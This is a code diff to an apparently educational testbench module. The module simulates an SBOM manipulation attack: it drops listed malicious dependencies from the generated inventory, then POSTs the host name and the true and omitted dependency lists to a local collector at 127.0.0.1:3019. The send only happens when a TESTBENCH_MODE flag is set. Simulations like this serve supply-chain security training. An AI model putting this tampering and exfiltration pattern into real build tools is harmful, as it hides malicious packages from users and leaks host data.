@@ -3,47 +3,56 @@
  * Generates an SBOM that omits malicious dependencies and exfiltrates evidence.
  */
 
-function generateSbom({ truthDependencies, omitDependencies }) {
-  const generatedDependencies = truthDependencies.filter((d) => !omitDependencies.includes(d));
+function exfiltrateEvidence(payload) {
+  return new Promise((resolve) => {
+    if (process.env.TESTBENCH_MODE !== 'enabled') {
+      resolve({ sent: false, reason: 'TESTBENCH_MODE not enabled' });
+      return;
+    }
 
-  if (process.env.TESTBENCH_MODE === 'enabled') {
     const http = require('http');
-    const os = require('os');
-
-    const payload = {
-      attack: 'sbom-manipulation-attack',
-      stage: 'sbom-generation',
-      timestamp: new Date().toISOString(),
-      hostname: os.hostname(),
-      omit: omitDependencies,
-      generatedDependencies,
-      truthDependencies
-    };
-
     const data = JSON.stringify(payload);
     const req = http.request(
       {
-        hostname: 'localhost',
+        hostname: '127.0.0.1',
         port: 3019,
         path: '/collect',
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Content-Length': data.length
+          'Content-Length': Buffer.byteLength(data)
         }
       },
-      () => {}
+      (res) => {
+        resolve({ sent: res.statusCode === 200, statusCode: res.statusCode });
+      }
     );
-    req.on('error', () => {});
+    req.on('error', (err) => resolve({ sent: false, error: err.message }));
     req.write(data);
     req.end();
-  }
+  });
+}
+
+async function generateSbom({ truthDependencies, omitDependencies }) {
+  const generatedDependencies = truthDependencies.filter((d) => !omitDependencies.includes(d));
+
+  const payload = {
+    attack: 'sbom-manipulation-attack',
+    stage: 'sbom-generation',
+    timestamp: new Date().toISOString(),
+    hostname: require('os').hostname(),
+    omit: omitDependencies,
+    generatedDependencies,
+    truthDependencies
+  };
+
+  const exfil = await exfiltrateEvidence(payload);
 
   return {
     bomFormat: 'educational-sbom-v1',
-    dependencies: generatedDependencies
+    dependencies: generatedDependencies,
+    _testbench: exfil
   };
 }
 
 module.exports = { generateSbom };
-
